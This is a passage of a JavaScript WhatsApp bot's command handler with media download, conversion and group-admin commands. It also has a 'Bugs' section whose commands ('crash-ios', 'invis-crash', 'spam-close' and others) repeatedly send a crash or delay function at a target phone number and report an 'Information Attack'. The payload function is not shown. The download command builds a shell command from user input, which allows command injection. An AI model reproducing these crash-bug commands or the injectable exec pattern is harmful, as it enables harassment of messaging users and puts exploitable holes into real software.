                .noVideo()
                .audioCodec("libmp3lame")
                .save(audioPath)
                .on("end", resolve)
                .on("error", reject);
        });

        await news.sendMessage(
            m.chat,
            { audio: fs.readFileSync(audioPath), mimetype: "audio/mpeg", fileName: `converted_audio.mp3` },
            { quoted: lol }
        );

        fs.unlinkSync(audioPath);
        fs.unlinkSync(videoPath); // remove video after conversion
        await news.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    } catch (err) {
        console.error(err);
        Reply("❌ Failed to convert video to audio.");
        await news.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
    }
}

break

case 'download': {
    if (!q) return Reply("❌ Please provide a video URL.\nExample: download https://youtu.be/abc123");

    Reply("⏳ Fetching video details...");

    const { exec } = require("child_process");
    const path = "./temp_video.mp4";
    const infoPath = "./temp_info.json";

    // Command to download both info.json and video
    const cmd = `yt-dlp --write-info-json --no-check-certificate -o "${path}" "${q}"`;

    exec(cmd, (err, stdout, stderr) => {
        if (err) {
            console.error(err);
            return Reply("❌ Could not download video.\nError: " + err.message);
        }

        const fs = require("fs");

        // Find the actual JSON file name
        let jsonFile = null;
        try {
            jsonFile = fs.readdirSync("./").find(f => f.endsWith(".info.json"));
        } catch (e) {
            return Reply("❌ Could not read video information file.");
        }

        if (!jsonFile) return Reply("❌ No video information found.");

        // Read and parse JSON info
        let info;
        try {
            info = JSON.parse(fs.readFileSync(jsonFile));
        } catch (e) {
            return Reply("❌ Failed to parse video info.");
        }

        const title = info.title || "Untitled";
        const uploader = info.uploader || "Unknown";
        const duration = info.duration ? `${Math.floor(info.duration/60)}m ${info.duration%60}s` : "Unknown";
        const views = info.view_count ? info.view_count.toLocaleString() : "Unknown";

        const caption = `🎬 *${title}*\n📺 Uploader: ${uploader}\n⏱ Duration: ${duration}\n👀 Views: ${views}`;

        // Send video with details
        news.sendMessage(from, { video: { url: path }, caption: caption }, { quoted: msg })
            .then(() => {
                // Cleanup
                fs.unlinkSync(path);
                fs.unlinkSync(jsonFile);
            })
            .catch(err => {
                console.error(err);
                Reply("❌ Failed to send video.");
            });
    });
}
break

// ========== [ 📂 Group Function CASE 📂 ] ========= //
     
case 'promote': {
if (!m.isGroup) return Reply("Only On Group Chat")
if (!isAdmins) return Reply("only Admin")
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await news.groupParticipantsUpdate(m.chat, [users], 'promote')
await Reply("Successful")
}

break
case 'kick': {
    if (!m.isGroup) return Reply("❌ This command can only be used in group chats.");
    if (!isAdmins && !isCreator) return Reply("❌ Only admins can use this command.");
    // Get target user
    let target;
    if (m.mentionedJid.length > 0) {
        target = m.mentionedJid[0];
    } else if (m.quoted) {
        target = m.quoted.sender;
    } else if (text) {
        target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    } else {
        return Reply("❌ Please mention, quote, or type the number of the user you want to kick.");
    }

    // Kick the user
    try {
        await news.groupParticipantsUpdate(m.chat, [target], 'remove');

        // Send confirmation with add-back button
        await news.sendMessage(m.chat, {
            text: `✅ @${target.split('@')[0]} has been removed from the group.`,
            mentions: [target],
            buttons: [
                {
                    buttonId: `.add ${target.split('@')[0]}`,
                    buttonText: { displayText: "➕ Add Back" },
                    type: 1
                }
            ],
            footer: "Tutorial Bot"
        }, { quoted: m });

    } catch (e) {
        Reply("❌ Failed to remove user. They might have left already or I lack permission.");
    }
}
break;

// ========== [ 📂 Bugs CASE 📂 ] ========= //

case 'crash-ios': {
if (!isCreator) return Reply("only For my Owner");
if (!q) return Reply(`Example : ${prefix + command} 234×××`);
    // Process number
let targets = q.replace(/[^0-9]/g, "");
if (targets.startsWith('0')) 
 return Reply(`Example : ${prefix + command} 234×××`);
 let target = targets + "@s.whatsapp.net";
await news.sendMessage(m.chat, { react: { text: '🤬', key: m.key } });
let process = `*Information Attack*
* Sender : ${m.pushName}
* Target : ${target}
* Status : Successful`
Reply(process)
for (let i = 0; i < 50; i++) {
// call ur bug function here
  console.log(chalk.red(`𝗦𝗲n𝗱in𝗴 𝗕𝘂𝗴`));
await delay72hr(target);
await delay72hr(target);
}
await news.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
   }
   
// Gc directly dm bug same with dm private bug
break;

case 'delay': {
if (!isCreator) return Reply("only For my Owner");
await news.sendMessage(m.chat, { react: { text: '🤬', key: m.key } });
let process = `*Information Attack*
* Sender : ${m.pushName}
* Status : Successful`
Reply(process)
for (let i = 0; i < 50; i++) {
// call ur bug function here
  console.log(chalk.red(`𝗦𝗲n𝗱in𝗴 𝗕𝘂𝗴`));
await delay72hr(target);
await delay72hr(target);
}
await news.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
   }
break;

case 'invis-crash': {
if (!isCreator) return Reply("only For my Owner");
await news.sendMessage(m.chat, { react: { text: '🤬', key: m.key } });
let process = `*Information Attack*
* Sender : ${m.pushName}
* Status : Successful`
Reply(process)
for (let i = 0; i < 50; i++) {
// call ur bug function here
  console.log(chalk.red(`𝗦𝗲n𝗱in𝗴 𝗕𝘂𝗴`));
await delay72hr(target);
await delay72hr(target);
}
await news.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
   }
break;

case 'spam-close': {
if (!isCreator) return Reply("only For my Owner");
await news.sendMessage(m.chat, { react: { text: '🤬', key: m.key } });
let process = `*Information Attack*
* Sender : ${m.pushName}
* Status : Successful`
Reply(process)
for (let i = 0; i < 50; i++) {
// call ur bug function here
  console.log(chalk.red(`𝗦𝗲n𝗱in𝗴 𝗕𝘂𝗴`));
await delay72hr(target);
await delay72hr(target);
}
await news.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
   }
break;

case 'host-delay': {
if (!isCreator) return Reply("only For my Owner");
await news.sendMessage(m.chat, { react: { text: '🤬', key: m.key } });
let process = `*Information Attack*
* Sender : ${m.pushName}
* Status : Successful`
Reply(process)
for (let i = 0; i < 50; i++) {
// call ur bug function here
  console.log(chalk.red(`𝗦𝗲n𝗱in𝗴 𝗕𝘂𝗴`));
await delay72hr(target);
await delay72hr(target);
}
await news.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
   }
break;

// ========== [ 📂 BATAS CASE 📂 ] ========= //
default:
if (budy.startsWith('>')) {
if (!isCreator) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await Reply(evaled);
} catch (err) {
Reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await Reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});